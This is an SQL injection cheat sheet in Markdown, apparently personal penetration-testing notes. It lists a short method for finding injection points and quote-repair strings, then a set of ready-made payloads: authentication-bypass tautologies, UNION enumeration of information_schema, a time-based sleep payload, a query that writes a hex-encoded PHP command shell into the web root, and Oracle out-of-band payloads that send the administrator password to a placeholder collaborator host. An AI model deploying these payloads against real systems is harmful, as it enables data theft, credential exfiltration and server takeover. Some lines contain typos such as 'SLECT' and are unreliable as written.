# SQLI METHOD
1. Find entry Points e.g. params cookies etc
2. Find valid and invalid values
3. Attempt to break with ' or "
4. If response changes repair the SQL querry
5. If repair diff from broken querry may have SQLI 

## How to Repair

<ul>
  <li>' >> ' '</li>
  <li>' >> '||'</li>
  <li>' >> '+' or '%2b'</li>
  <li>' >>' AND '1'='1</li>
  <li>' >> ' -- -</li>
</ul>

Repairs for Int
'(quote) will break >>Syntax even if Repaired just try to start with a Space
<ul>
  <li>-- -</li>
  <li> AND 1=1 </li>
  <li>AND 1=1 -- -</li>
</ul>

## INJECTS
```
'+OR+1=1--

=1' OR '1'='1
 
=1' OR '1'='1'--+

=1'+UNION+SLECT+1,2,3,4,5+FROM+TABLE    ?!?!?

'XOR(if(now()=sysdate(),sleep(5*5),0))OR'

value' INTO OUTFILE '/var/www/html/shelll.php' LINES TERMINATED BY 'union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -

 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
 union select "1 order by 1-- -",2,3 from information_schema.tables where table_schema=database()
```
## OutOfBound injection
###Oracle
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```